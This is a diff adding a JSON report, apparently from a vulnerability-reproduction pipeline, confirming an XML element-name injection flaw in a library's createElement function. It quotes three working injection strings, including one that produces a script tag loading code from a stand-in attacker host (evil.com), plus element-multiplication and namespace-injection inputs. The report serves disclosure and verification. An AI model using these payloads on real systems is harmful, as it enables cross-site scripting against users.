@@ -1,0 +1,30 @@
+{
+  "status": "reproduced",
+  "vulnerability_type": "xml_injection",
+  "summary": "The Docker-based reproduction successfully demonstrates multiple element name injection attacks: attribute injection (enabling XSS), element multiplication (creating multiple unintended elements), and namespace injection. All three attacks succeeded, confirming the vulnerability.",
+  "reproduction_command": "./reproduction/run.sh",
+  "expected_security_impact": "Running the reproduction should demonstrate that malformed element names passed to createElement are accepted without validation, resulting in: (1) attribute injection enabling XSS when serialized XML is rendered in browsers, (2) creation of multiple elements from a single createElement call, and (3) namespace confusion through injected xmlns attributes.",
+  "actual_observed_result": "All three attack scenarios succeeded: (1) createElement('script src=\"http://evil.com/xss.js\"') produced <script src=\"http://evil.com/xss.js\"/>, (2) createElement('a/><b/><c') produced three separate elements <a/><b/><c/>, and (3) createElement('child xmlns=\"http://evil.com\"') injected a namespace attribute. The verification script confirmed all attacks succeeded.",
+  "verification_method": "The exploit.js script performs three distinct attacks and checks that each serialized output contains the expected injected content. The verify.sh script checks for the 'SUCCESS' marker in the results file. This distinguishes successful exploitation from parser errors or unrelated failures.",
+  "verification_passed": true,
+  "evidence_produced_by_run": [
+    "Container logs show successful attribute injection: <script src=\"http://evil.com/xss.js\"/> was produced from createElement input.",
+    "Container logs show successful element multiplication: three separate elements <a/>, <b/>, <c/> were created from single createElement call.",
+    "Container logs show successful namespace injection: xmlns=\"http://evil.com\" was injected into element.",
+    "The poc_result.txt file contains 'SUCCESS: All element name injection attacks succeeded'.",
+    "The verify.sh script confirmed all verification checks passed."
+  ],
+  "limitations_or_blockers": [],
+  "reproduction": {
+    "entrypoint": "./reproduction/run.sh",
+    "reproduction_directory": "reproduction",
+    "dockerfile_path": "reproduction/Dockerfile",
+    "source_acquisition": "run.sh clones the target repository on the host, checks out the pinned vulnerable commit, and mounts that checkout into the container at /target-repo.",
+    "pinned_commit_or_ref": "0.9.9",
+    "target_repo_mount_path": "/target-repo",
+    "helper_files": [
+      "reproduction/exploit.js",
+      "reproduction/verify.sh"
+    ]
+  }
+}
